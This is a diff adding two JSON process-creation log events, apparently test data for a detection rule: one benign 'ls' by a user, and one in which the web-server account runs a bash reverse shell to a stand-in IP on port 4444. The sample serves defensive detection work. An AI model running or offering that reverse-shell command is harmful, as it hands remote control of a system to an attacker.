@@ -1,0 +1,2 @@
+{"logsource":{"category":"process_creation"},"Image":"/bin/bash","CommandLine":"bash -i >& /dev/tcp/203.0.113.9/4444 0>&1","User":"www-data"}
+{"logsource":{"category":"process_creation"},"Image":"/usr/bin/ls","CommandLine":"ls -la /tmp","User":"alice"}
